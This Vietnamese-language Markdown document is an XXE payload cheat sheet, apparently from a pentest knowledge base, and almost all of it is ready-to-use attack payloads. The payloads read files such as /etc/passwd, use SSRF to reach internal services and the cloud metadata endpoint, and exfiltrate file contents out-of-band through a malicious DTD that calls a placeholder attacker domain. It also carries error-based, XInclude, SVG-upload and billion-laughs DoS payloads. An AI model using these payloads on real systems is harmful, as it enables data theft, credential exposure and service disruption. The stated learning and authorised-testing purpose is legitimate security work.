# Sổ Tay Payload XXE

## Ghi Chú Sử Dụng

- Payload trong file này phục vụ học tập, pentest hợp pháp và xây dựng lab.
- Luôn test trong phạm vi được ủy quyền.
- Thay các giá trị mẫu (`ATTACKER_DOMAIN`, đường dẫn file, endpoint) theo môi trường thực tế.

## 1. Kiểm Tra Năng Lực Parser

### Kiểm Tra Internal Entity

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test "XXE_OK">]>
<root><v>&test;</v></root>
```

### Kiểm Tra External Entity Cơ Bản

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<root><v>&xxe;</v></root>
```

## 2. Đọc File

### Linux `/etc/passwd`

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><v>&xxe;</v></root>
```

### Windows `boot.ini`

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]>
<root><v>&xxe;</v></root>
```

### Bộ Bao PHP Base64

```xml
<!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root>&xxe;</root>
```

## 3. XXE Sang SSRF

```xml
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://internal.service.local/">]>
<root><v>&xxe;</v></root>
```

### Thăm Dò Metadata Cloud

```xml
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><v>&xxe;</v></root>
```

## 4. Phát Hiện Blind XXE (OOB)

### Thực Thể Tổng Quát OOB

```xml
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://ATTACKER_DOMAIN">]>
<root><v>&xxe;</v></root>
```

### Thực Thể Tham Số OOB

```xml
<!DOCTYPE root [
  <!ENTITY % xxe SYSTEM "http://ATTACKER_DOMAIN">
  %xxe;
]>
<root>1</root>
```

## 5. Exfiltration OOB Với External DTD

### Request Chính

```xml
<!DOCTYPE root [
  <!ENTITY % ext SYSTEM "http://ATTACKER_DOMAIN/malicious.dtd">
  %ext;
]>
<root>1</root>
```

### malicious.dtd

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_DOMAIN/?x=%file;'>">
%eval;
%exfil;
```

## 6. Error-Based XXE

### Rò Rỉ Lỗi Qua External DTD

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

## 7. Mẫu Khung Tái Mục Đích Local DTD

```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>">
    %eval;
    %error;
  '>
  %local_dtd;
]>
<foo>1</foo>
```

## 8. XInclude (Khi Không Control Được DOCTYPE)

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

## 9. SVG Upload XXE

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

## 10. DoS (Chỉ Dùng Trong Lab)

```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
]>
<data>&a3;</data>
```

## 11. Checklist Kiểm Thử Theo Từng Payload

1. Có parse XML thật sự?
2. Có resolve entity thật sự?
3. Signal là in-band, error-based hay OOB?
4. Có bị egress filter/validation chặn không?
5. Có tái hiện được impact với payload ổn định không?

## Tệp Liên Quan

- [03-detection.md](03-detection.md)
- [04-exploitation-workflow.md](04-exploitation-workflow.md)
- [11-defense-mitigation.md](11-defense-mitigation.md)
